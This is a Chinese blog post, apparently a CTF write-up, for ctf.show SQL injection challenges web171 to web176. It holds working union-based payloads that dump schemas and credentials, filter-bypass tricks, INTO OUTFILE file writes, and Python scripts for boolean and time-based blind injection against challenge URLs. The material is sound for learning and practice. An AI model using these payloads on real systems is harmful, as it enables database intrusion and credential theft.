<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>SQL | wanan</title><meta name="keywords" content="CTF,ctf.show,SQL注入"><meta name="author" content="wanan"><meta name="copyright" content="wanan"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="web171注入学习  $sql &#x3D; &quot;select username,password from user where username !&#x3D;&amp;#x27;flag&amp;#x27; and id &#x3D; &amp;#x27;&quot;.$_GET[&amp;#x27;id&amp;#x27;].&quot;&amp;#x27; limit 1;&quot;;  象征性测试下闭合方式 1	正常1&amp;#x27;	异常1&quot;">
<meta property="og:type" content="article">
<meta property="og:title" content="SQL">
<meta property="og:url" content="https://www.wanan.red/4d712856.html">
<meta property="og:site_name" content="wanan">
<meta property="og:description" content="web171注入学习  $sql &#x3D; &quot;select username,password from user where username !&#x3D;&amp;#x27;flag&amp;#x27; and id &#x3D; &amp;#x27;&quot;.$_GET[&amp;#x27;id&amp;#x27;].&quot;&amp;#x27; limit 1;&quot;;  象征性测试下闭合方式 1	正常1&amp;#x27;	异常1&quot;">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.pixabay.com/photo/2016/12/14/04/08/thunderbolt-1905603_1280.png">
<meta property="article:published_time" content="2022-10-18T15:01:57.442Z">
<meta property="article:modified_time" content="2022-11-25T09:34:53.614Z">
<meta property="article:author" content="wanan">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="ctf.show">
<meta property="article:tag" content="SQL注入">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.pixabay.com/photo/2016/12/14/04/08/thunderbolt-1905603_1280.png"><link rel="shortcut icon" href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203092159138.jpeg"><link rel="canonical" href="https://www.wanan.red/4d712856"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="Lkrie_55AalLqll4AtBs-NEomlv8QQYHGMx1V0cbq88"/><meta name="baidu-site-verification" content="code-h7qMMwh8fd"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?0a85e115f35e16b8da9503b0d77633ca";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-FYB0HL88QE"></script><script>window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-FYB0HL88QE');
</script><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'SQL',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-11-25 17:34:53'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203092159138.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">110</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">87</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">96</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.pixabay.com/photo/2016/12/14/04/08/thunderbolt-1905603_1280.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">wanan</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">SQL</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-10-18T15:01:57.442Z" title="发表于 2022-10-18 23:01:57">2022-10-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-11-25T09:34:53.614Z" title="更新于 2022-11-25 17:34:53">2022-11-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf-show/">ctf.show</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">16.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>88分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="SQL"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h1><p><a target="_blank" rel="noopener" href="https://lazzzaro.github.io/2020/05/16/web-SQL%E6%B3%A8%E5%85%A5/">注入学习</a></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203262159528.png" alt="image-20220326215919454"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;select username,password from user where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[&#x27;id&#x27;].&quot;&#x27; limit 1;&quot;;</span><br></pre></td></tr></table></figure>

<p>象征性测试下闭合方式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1	正常</span><br><span class="line">1&#x27;	异常</span><br><span class="line">1&quot;	正常</span><br></pre></td></tr></table></figure>

<p>说明是单引号闭合,测试字段数,这里注意使用%23哦</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 3%23	正常</span><br><span class="line">1&#x27; order by 4%23	异常</span><br></pre></td></tr></table></figure>

<p>说明三个,查回显地方</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select 1,2,3%23</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203262202465.png" alt="image-20220326220256430"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select 1,database(),3%23</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203262203899.png" alt="image-20220326220315862"></p>
<p>爆数据库名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;union select 1,group_concat(schema_name),3 from information_schema.schemata%23</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203262204734.png" alt="image-20220326220443697"></p>
<p>爆表名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203262205150.png" alt="image-20220326220540113"></p>
<p>爆字段名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;ctfshow_user&#x27;%23</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203271016776.png" alt="image-20220327101643682"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;union select 1,group_concat(username,password),3 from ctfshow_user%23</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203271017854.png" alt="image-20220327101732815"></p>
<p>更简单的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; or 1%23</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203301345625.png" alt="image-20220330134534509"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;select username,password from user where username !=&#x27;flag&#x27; and id = &#x27;-1&#x27; or 1%23&#x27; limit 1;&quot;;</span><br></pre></td></tr></table></figure>

<h1 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203301335972.png" alt="image-20220330133530883"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//拼接sql语句查找指定ID用户</span><br><span class="line">$sql = &quot;select username,password from ctfshow_user2 where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[&#x27;id&#x27;].&quot;&#x27; limit 1;&quot;;</span><br><span class="line"></span><br><span class="line">//检查结果是否有flag</span><br><span class="line">    if($row-&gt;username!==&#x27;flag&#x27;)&#123;</span><br><span class="line">      $ret[&#x27;msg&#x27;]=&#x27;查询成功&#x27;;</span><br><span class="line">    &#125;  </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">字段</span><br><span class="line">1&#x27; order by 3%23	异常</span><br><span class="line">1&#x27; order by 2%23	正常</span><br><span class="line"></span><br><span class="line">数据库</span><br><span class="line">1&#x27; union select 1,database()%23</span><br><span class="line">1&#x27;union select 1,group_concat(schema_name) from information_schema.schemata%23</span><br><span class="line"></span><br><span class="line">表名</span><br><span class="line">-1&#x27;union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()%23	#有两张表,第二张是这关的</span><br><span class="line"></span><br><span class="line">字段名</span><br><span class="line">-1&#x27;union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_user&#x27;%23</span><br><span class="line"></span><br><span class="line">数据</span><br><span class="line">-1&#x27;union select 1,group_concat(username,password) from ctfshow_user2%23</span><br></pre></td></tr></table></figure>

<p>新学的base64加密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0&#x27; union select 1,to_base64(password) from ctfshow_user2 where username=&quot;flag&quot;%23</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203301358191.png" alt="image-20220330135800134"></p>
<h1 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220407094914986.png" alt="image-20220407094914986"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//拼接sql语句查找指定ID用户</span><br><span class="line">$sql = &quot;select id,username,password from ctfshow_user3 where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[&#x27;id&#x27;].&quot;&#x27; limit 1;&quot;;</span><br><span class="line"></span><br><span class="line">//检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#x27;/flag/i&#x27;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#x27;msg&#x27;]=&#x27;查询成功&#x27;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>与上面差不多,换一个函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0&#x27; union select 1,hex(password),3 from ctfshow_user3 where username=&quot;flag&quot;%23</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220407095103698.png" alt="image-20220407095103698"></p>
<h1 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220407095244739.png" alt="image-20220407095244739"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/拼接sql语句查找指定ID用户</span><br><span class="line">$sql = &quot;select username,password from ctfshow_user4 where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[&#x27;id&#x27;].&quot;&#x27; limit 1;&quot;;</span><br><span class="line">sel</span><br><span class="line">//检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#x27;/flag|[0-9]/i&#x27;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#x27;msg&#x27;]=&#x27;查询成功&#x27;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里返回一般不让有flag和数字,那么我们想办法替换一下,替换的思路将1-0数字用q~p替换，但本来的flag中一定也会有一些小写字母，这样的话就没办法分辨那个是原本的字母哪个是替换出来的。所以为了避免这个问题，将password首先hex一下，因为hex()函数的返回值中字母都是大写的，所以我们返回结果中的小写字母就是原来的数字，而大写字母就是原本的字符。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select &#x27;q&#x27;,(select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(hex(password),&#x27;1&#x27;,&#x27;q&#x27;),&#x27;2&#x27;,&#x27;w&#x27;),&#x27;3&#x27;,&#x27;e&#x27;),&#x27;4&#x27;,&#x27;r&#x27;),&#x27;5&#x27;,&#x27;t&#x27;),&#x27;6&#x27;,&#x27;y&#x27;),&#x27;7&#x27;,&#x27;u&#x27;),&#x27;8&#x27;,&#x27;i&#x27;),&#x27;9&#x27;,&#x27;o&#x27;),&#x27;0&#x27;,&#x27;p&#x27;) from ctfshow_user4 where username=&#x27;flag&#x27;)--+</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220407095715741.png" alt="image-20220407095715741"></p>
<p>在自己替换一下</p>
<p>盲注测试一下下</p>
<p>抓包发现向这个页面请求的数据</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220407102847062.png" alt="image-20220407102847062"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and length(database())&gt;0%23	</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220407103005812.png" alt="image-20220407103005812"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and length(database())=0%23	</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220407103025956.png" alt="image-20220407103025956"></p>
<p>也就是说如果后面为真就返回admin,如果后面为假就不返回admin</p>
<h2 id="get有回显布尔无空格和逗号的脚本"><a href="#get有回显布尔无空格和逗号的脚本" class="headerlink" title="get有回显布尔无空格和逗号的脚本"></a>get有回显布尔无空格和逗号的脚本</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload = 1&#x27;&amp;&amp;length((select(password)from(ctfshow_user4)where(id=26)))&gt;&#123;mid&#125;#</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pwd_len</span>(<span class="params">url</span>):</span><br><span class="line">    head = <span class="number">1</span></span><br><span class="line">    tail = <span class="number">100</span></span><br><span class="line">    ans = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail ) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = <span class="string">f&quot;1&#x27;&amp;&amp;length((select(password)from(ctfshow_user4)where(id=26)))&gt;<span class="subst">&#123;mid&#125;</span>#&quot;</span></span><br><span class="line">        <span class="comment"># print(uname)</span></span><br><span class="line">        param = &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: payload,</span><br><span class="line">            <span class="string">&#x27;page&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;limit&#x27;</span>: <span class="string">&#x27;10&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.get(url=url,params=param)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;admin&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">            ans = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="built_in">print</span>(ans)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># passwd长度为:45</span></span><br><span class="line">url=<span class="string">&quot;http://c0fd21f5-b919-4d9c-aac8-de4d325b3a8b.challenge.ctf.show/api/v4.php&quot;</span></span><br><span class="line">get_pwd_len(url)</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = 1&#x27;&amp;&amp;ascii(substr((reverse(substr((select(password)from(ctfshow_user4)where(id=26))from(&#123;i&#125;))))from(&#123;j&#125;)))&gt;&#123;mid&#125;#</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pwd</span>(<span class="params">url</span>):</span><br><span class="line">    ans = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">46</span>):</span><br><span class="line">        <span class="comment"># print(i)</span></span><br><span class="line">        j = <span class="number">46</span> - i</span><br><span class="line">        <span class="comment"># print(j)</span></span><br><span class="line">        head = <span class="number">32</span></span><br><span class="line">        tail = <span class="number">127</span></span><br><span class="line">        <span class="keyword">while</span> head &lt;tail:</span><br><span class="line">            mid = (head + tail) &gt;&gt; <span class="number">1</span> <span class="comment">#&gt;&gt;是位移运算符 右移一位就是除以二</span></span><br><span class="line">            payload = <span class="string">f&quot;1&#x27;&amp;&amp;ascii(substr((reverse(substr((select(password)from(ctfshow_user4)where(id=26))from(<span class="subst">&#123;i&#125;</span>))))from(<span class="subst">&#123;j&#125;</span>)))&gt;<span class="subst">&#123;mid&#125;</span>#&quot;</span></span><br><span class="line">            <span class="comment"># print(uname)</span></span><br><span class="line">            param = &#123;</span><br><span class="line">                <span class="string">&#x27;id&#x27;</span>: payload,</span><br><span class="line">                <span class="string">&#x27;page&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;limit&#x27;</span>: <span class="string">&#x27;10&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">            res = requests.get(url=url,params=param)</span><br><span class="line">            <span class="comment"># print(res.text)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;admin&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                head = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tail = mid</span><br><span class="line">        <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">            ans += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span>(ans)</span><br><span class="line">url=<span class="string">&quot;http://c0fd21f5-b919-4d9c-aac8-de4d325b3a8b.challenge.ctf.show/api/v4.php&quot;</span></span><br><span class="line">get_pwd(url)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>除了盲注还可以写文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/v4.php?id=1&#x27; union select 1,password from ctfshow_user4 into outfile &#x27;/var/www/html/1.txt&#x27;--+&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220407130358634.png" alt="image-20220407130358634"></p>
<h1 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220407124216316.png" alt="image-20220407124216316"></p>
<p>这次是直接没有回显了</p>
<h2 id="get时间盲注无空格和逗号的脚本"><a href="#get时间盲注无空格和逗号的脚本" class="headerlink" title="get时间盲注无空格和逗号的脚本"></a>get时间盲注无空格和逗号的脚本</h2><p>稍微修改一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pwd_len</span>(<span class="params">url</span>):</span><br><span class="line">    head = <span class="number">1</span></span><br><span class="line">    tail = <span class="number">100</span></span><br><span class="line">    ans = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail ) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = <span class="string">f&quot;1&#x27;&amp;&amp;if(length((select(password)from(ctfshow_user5)where(id=26)))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(2),0)#&quot;</span></span><br><span class="line">        <span class="comment"># print(uname)</span></span><br><span class="line">        param = &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: payload,</span><br><span class="line">            <span class="string">&#x27;page&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;limit&#x27;</span>: <span class="string">&#x27;10&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.get(url=url,params=param)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url,params=param,timeout=<span class="number">0.5</span>)</span><br><span class="line">            tail = mid</span><br><span class="line">            ans = mid</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e :</span><br><span class="line">            head = mid +<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(ans)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># passwd长度为:45</span></span><br><span class="line">url=<span class="string">&quot;http://c7c6c7b5-e27e-46b5-ac09-66d7f0ede948.challenge.ctf.show/api/v5.php&quot;</span></span><br><span class="line">get_pwd_len(url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pwd</span>(<span class="params">url</span>):</span><br><span class="line">    ans = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">46</span>):</span><br><span class="line">        <span class="comment"># print(i)</span></span><br><span class="line">        j = <span class="number">46</span> - i</span><br><span class="line">        <span class="comment"># print(j)</span></span><br><span class="line">        head = <span class="number">32</span></span><br><span class="line">        tail = <span class="number">127</span></span><br><span class="line">        <span class="keyword">while</span> head &lt;tail:</span><br><span class="line">            mid = (head + tail) &gt;&gt; <span class="number">1</span> <span class="comment">#&gt;&gt;是位移运算符 右移一位就是除以二</span></span><br><span class="line">            payload = <span class="string">f&quot;1&#x27;&amp;&amp;if(ascii(substr((reverse(substr((select(password)from(ctfshow_user5)where(id=26))from(<span class="subst">&#123;i&#125;</span>))))from(<span class="subst">&#123;j&#125;</span>)))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(2),0)#&quot;</span></span><br><span class="line">            <span class="comment"># print(uname)</span></span><br><span class="line">            param = &#123;</span><br><span class="line">                <span class="string">&#x27;id&#x27;</span>: payload,</span><br><span class="line">                <span class="string">&#x27;page&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;limit&#x27;</span>: <span class="string">&#x27;10&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                res = requests.get(url=url,params=param,timeout=<span class="number">0.5</span>)</span><br><span class="line">                tail = mid</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                head = mid + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">            ans += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span>(ans)</span><br><span class="line">url=<span class="string">&quot;http://c7c6c7b5-e27e-46b5-ac09-66d7f0ede948.challenge.ctf.show/api/v5.php&quot;</span></span><br><span class="line">get_pwd(url)</span><br></pre></td></tr></table></figure>

<p>这里有逗号,等研究研究在试试能不能去掉逗号</p>
<p>这里当然也可以写文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/v5.php?id=1&#x27; union select 1,password from ctfshow_user5 into outfile &#x27;/var/www/html/1.txt&#x27;--+&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure>

<h1 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220407130600142.png" alt="image-20220407130600142"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; or 1%23</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220407130612382.png" alt="image-20220407130612382"></p>
